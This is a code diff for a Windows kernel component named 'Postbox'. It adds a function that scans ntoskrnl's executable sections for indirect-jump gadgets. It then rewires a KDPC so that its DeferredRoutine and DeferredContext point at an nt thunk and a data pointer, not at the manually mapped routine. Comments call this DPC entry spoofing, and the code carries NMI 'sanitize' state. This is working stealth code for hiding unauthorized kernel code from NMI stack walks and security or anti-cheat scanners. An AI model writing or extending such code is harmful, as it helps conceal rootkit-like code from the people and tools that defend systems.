@@ -54,11 +54,12 @@ static_assert(sizeof(PostboxWork) == 0x20, "WORK_QUEUE_ITEM layout changed");
 // item is queued and cleared again after the worker dequeues it.
 struct PostboxWorkContext
 {
-    uint64_t Entry;                     // 0x00: nt thunk target
+    uint64_t Entry;                     // 0x00: nt work thunk target
     uint64_t State;                     // 0x08: resident state page (data)
     PostboxWork Work;                   // 0x10: actual WORK_QUEUE_ITEM
+    uint64_t DpcEntry;                  // 0x30: nt DPC deref thunk target
 };
-static_assert(sizeof(PostboxWorkContext) == 0x30, "work context layout changed");
+static_assert(sizeof(PostboxWorkContext) == 0x38, "work context layout changed");
 
 using FnKeInitializeTimerEx = void (*)(PostboxTimer*, int32_t);
 using FnKeInitializeDpc = void (*)(PostboxDpc*, void (*)(void*, void*, void*, void*), void*);
@@ -1492,6 +1493,29 @@ static uint64_t PostboxNmiFindWorkJumpGadget(address Nt, uint64_t NtSize)
                 return Sections[i].Va + j;
         for (uint64_t j = 0; j + 2 < Sections[i].Size; ++j)
             if (P[j] == 0xFF && P[j + 1] == 0x61 && P[j + 2] == 0x00)
+                return Sections[i].Va + j;
+    }
+    return 0;
+}
+
+// First dereferencing DPC thunk: `jmp qword ptr [rdx]` (FF 22),
+// `jmp qword ptr [rdx+disp8]` (FF 62 xx), or `mov rax,[rdx]; jmp rax`.
+// At DPC entry RDX = DeferredContext; DeferredContext can point at a context
+// whose first qword is the mapped DPC routine, so the KDPC field holds a data
+// pointer rather than the mapped code address.
+static uint64_t PostboxNmiFindDpcDerefGadget(address Nt, uint64_t NtSize)
+{
+    PostboxNmiSection Sections[16] = {};
+    const uint32_t Count = PostboxNmiExecSections(Nt, NtSize, Sections, 16);
+    for (uint32_t i = 0; i < Count; ++i)
+    {
+        const uint8_t* P = (const uint8_t*) (uintptr_t) Sections[i].Va;
+        for (uint64_t j = 0; j + 2 < Sections[i].Size; ++j)
+            if (P[j] == 0xFF && P[j + 1] == 0x22)
+                return Sections[i].Va + j;
+        for (uint64_t j = 0; j + 4 < Sections[i].Size; ++j)
+            if (P[j] == 0x48 && P[j + 1] == 0x8B && P[j + 2] == 0x02 &&
+                P[j + 3] == 0xFF && P[j + 4] == 0xE0)
                 return Sections[i].Va + j;
     }
     return 0;
@@ -3151,11 +3175,26 @@ static void PostboxInstallDpcSpoof(PostboxState* S)
         print(WARN("Postbox: DPC jump gadget not found"));
         return;
     }
-    S->Dpc.DeferredRoutine = (void*) (uintptr_t) Gadget;
-    S->Dpc.DeferredContext = (void*) (uintptr_t) &PostboxDpcRoutine;
+    const uint64_t Deref = PostboxNmiFindDpcDerefGadget(Nt, NtSize);
+    if (Deref && S->WorkCtx)
+    {
+        // KDPC.DeferredRoutine = nt `jmp [rdx]` thunk; DeferredContext points
+        // at the detached context's DpcEntry, which holds the mapped routine.
+        S->WorkCtx->DpcEntry = (uint64_t) (uintptr_t) &PostboxDpcRoutine;
+        S->Dpc.DeferredRoutine = (void*) (uintptr_t) Deref;
+        S->Dpc.DeferredContext = (void*) &S->WorkCtx->DpcEntry;
+    }
+    else
+    {
+        // Fallback: the direct nt jump thunk still hides the KDPC field, but
+        // DeferredContext remains the mapped routine.
+        S->Dpc.DeferredRoutine = (void*) (uintptr_t) Gadget;
+        S->Dpc.DeferredContext = (void*) (uintptr_t) &PostboxDpcRoutine;
+    }
     S->WorkJump = PostboxNmiFindWorkJumpGadget(Nt, NtSize);
-    print(INFO("Postbox: DPC entry spoofed (%p), work entry thunk %p"),
-          (void*) (uintptr_t) Gadget, (void*) (uintptr_t) S->WorkJump);
+    print(INFO("Postbox: DPC entry spoofed (%p deref %p), work entry thunk %p"),
+          (void*) (uintptr_t) Gadget, (void*) (uintptr_t) Deref,
+          (void*) (uintptr_t) S->WorkJump);
 }
 #endif
 
@@ -3512,8 +3551,11 @@ static void PostboxPollAttached(void* MailboxProcess)
         St.LastCore = PostboxStatePtr->NmiSanitize.LastCore;
         St.LastRip = PostboxStatePtr->NmiSanitize.LastRip;
         St.LastRsp = PostboxStatePtr->NmiSanitize.LastRsp;
-        St.RefreshActive = 0;
-        St.RefreshRun = 0;
+        // Test-only: report whether the nt work-entry thunk was selected and
+        // its address. RefreshActive/RefreshRun are leftover ABI slots now that
+        // refresh runs on the worker.
+        St.RefreshActive = PostboxStatePtr->WorkJump ? 1 : 0;
+        St.RefreshRun = PostboxStatePtr->WorkJump;
         St.RefreshCount = PostboxStatePtr->NmiSanitize.RefreshCount;
         St.ListHead = PostboxStatePtr->NmiSanitize.ListHead;
         St.NtBase = PostboxStatePtr->NmiSanitize.NtBase;
